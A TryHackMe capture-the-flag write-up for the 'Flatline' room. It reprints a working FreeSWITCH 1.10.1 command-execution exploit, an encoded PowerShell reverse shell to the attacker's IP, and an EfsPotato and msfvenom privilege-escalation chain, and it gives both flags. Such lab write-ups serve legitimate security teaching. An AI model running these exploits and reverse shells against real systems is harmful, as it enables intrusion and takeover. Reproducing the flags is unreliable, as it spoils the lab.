@@ -1,0 +1,258 @@
+-------------------------------------TRYHACKME Flatline ROOM ----------------------------------
+Room name: Flatline
+Ip: 10.10.212.232
+Level: Easy
+Date: 22/07/2025
+Time to solve: 1h
+
+
+############Enumeration
+PORT     STATE SERVICE          VERSION
+3389/tcp open  ms-wbt-server    Microsoft Terminal Services
+| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
+| Not valid before: 2025-07-21T06:41:52
+|_Not valid after:  2026-01-20T06:41:52
+|_ssl-date: 2025-07-22T06:49:24+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: WIN-EOM4PK0578N
+|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
+|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
+|   DNS_Domain_Name: WIN-EOM4PK0578N
+|   DNS_Computer_Name: WIN-EOM4PK0578N
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-07-22T06:49:19+00:00
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+Here we have 2 open port 
+3389 --> RDP
+8021 --> FreeSwitch 
+
+So let us see hoa can we analyze the 8021 port
+
+┌──(thierry㉿thierry)-[~/…/rooms/Tryhackme/Flatline/CVE-2019-19492]
+└─$ telnet 10.10.212.232 8021
+Trying 10.10.212.232...
+Connected to 10.10.212.232.
+Escape character is '^]'.
+Content-Type: auth/request
+
+help
+ls
+ehlo toto
+?
+Content-Type: text/disconnect-notice
+Content-Length: 67
+
+Disconnected, goodbye.
+See you at ClueCon! http://www.cluecon.com/
+Connection closed by foreign host.
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/…/rooms/Tryhackme/Flatline/CVE-2019-19492]
+└─$ nc 10.10.212.232 8021             
+Content-Type: auth/request
+
+Content-Type: text/disconnect-notice
+Content-Length: 67
+
+Disconnected, goodbye.
+See you at ClueCon! http://www.cluecon.com/
+
+
+Now searching for exploits ------------------------------------------------------------------------------------------------------------##########################################################################"
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/Flatline]
+└─$ searchsploit freeswitch                 
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+FreeSWITCH - Event Socket Command Execution (Metasploit)                                                                                   | multiple/remote/47698.rb
+FreeSWITCH 1.10.1 - Command Execution                                                                                                      | windows/remote/47799.txt
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/Flatline]
+└─$ searchsploit -m windows/remote/47799.txt 
+  Exploit: FreeSWITCH 1.10.1 - Command Execution
+      URL: https://www.exploit-db.com/exploits/47799
+     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/thierry/Desktop/rooms/Tryhackme/Flatline/47799.txt
+
+
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/Flatline]
+└─$ cat 47799.txt 
+# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
+# Date: 2019-12-19
+# Exploit Author: 1F98D
+# Vendor Homepage: https://freeswitch.com/
+# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
+# Version: 1.10.1
+# Tested on: Windows 10 (x64)
+#
+# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
+# it after authenticating. By default commands are not accepted from remote hosts.
+#
+# -- Example --
+# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
+# Authenticated
+# Content-Type: api/response
+# Content-Length: 20
+#
+# nt authority\system
+#
+
+#!/usr/bin/python3
+
+from socket import *
+import sys
+
+if len(sys.argv) != 3:
+    print('Missing arguments')
+    print('Usage: freeswitch-exploit.py <target> <cmd>')
+    sys.exit(1)
+
+ADDRESS=sys.argv[1]
+CMD=sys.argv[2]
+PASSWORD='ClueCon' # default password for FreeSWITCH
+
+s=socket(AF_INET, SOCK_STREAM)
+s.connect((ADDRESS, 8021))
+
+response = s.recv(1024)
+if b'auth/request' in response:
+    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
+    response = s.recv(1024)
+    if b'+OK accepted' in response:
+        print('Authenticated')
+        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
+        response = s.recv(8096).decode()
+        print(response)
+    else:
+        print('Authentication failed')
+        sys.exit(1)
+else:
+    print('Not prompted for authentication, likely not vulnerable')
+    sys.exit(1)                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/Flatline]
+└─$ nano exploit.py                                                                    
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/Flatline]
+└─$ python3 exploit.py 10.10.212.232 whoami     
+Authenticated
+Content-Type: api/response
+Content-Length: 25
+
+win-eom4pk0578n\nekrotic
+
+
+For the exploit i use a reverse shell powershell on the site: https://www.revshells.com/
+
+The code: python3 exploit.py 10.10.212.232 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAxAC4AMQAyADcALgAxADIANQAiACwAMQAyADMANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+
+
+Now the reverse shell
+┌──(thierry㉿thierry)-[~/…/rooms/Tryhackme/Flatline/CVE-2019-19492]
+└─$ rlwrap nc -lvnp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.212.232 49909
+
+PS C:\Program Files\FreeSWITCH> whoami
+win-eom4pk0578n\nekrotic
+PS C:\Program Files\FreeSWITCH> 
+
+PS C:\users\Nekrotic\desktop> dir
+
+
+    Directory: C:\users\Nekrotic\desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       09/11/2021     07:39             38 root.txt                                                              
+-a----       09/11/2021     07:39             38 user.txt                                                              
+
+
+PS C:\users\Nekrotic\desktop> type user.txt
+THM{64bca0843d535fa73eecdc59d27cbe26} 
+
+###################################################################PRIvilege escalation###############################################"""
+ to start i begin with whoami /priv
+ 
+ PS C:\users\Nekrotic\desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+
+
+Here i see that i have SeImpersonatePrivilege enable so i decide to try it
+
+step 1: download the efspotato.cs
+--> powershell iwr http://10.11.127.125/EfsPotato.cs -outf EfsPotato.cs
+
+Step 2: Compile the cs into exe
+--> C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs
+
+Step 3: Create the reverse shell on my attacking machine
+--> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.127.125 LPORT=12345 -f exe -o shell.exe
+
+Step 4: Download the reverse shell
+--> powershell iwr http://10.11.127.125/shell.exe -outf shell.exe
+
+Step 5: Launch our inpersonation with our 2 exe files
+--> .\EfsPotato.exe shell.exe
+
+Step 6: Getting our reverse shell and reading the flag
+
+┌──(thierry㉿thierry)-[~/Desktop/Tools/EfsPotato]
+└─$ rlwrap nc -lvnp 12345
+Listening on 0.0.0.0 12345
+Connection received on 10.10.212.232 49970
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\users\nekrotic\desktop>whoami
+whoami
+nt authority\system
+
+C:\users\nekrotic\desktop>type root.txt
+type root.txt
+THM{8c8bc5558f0f3f8060d00ca231a9fb5e} 
+C:\users\nekrotic\desktop>
+
+
+
+
+Thanks for reading
+
+Made by petstar from Togo
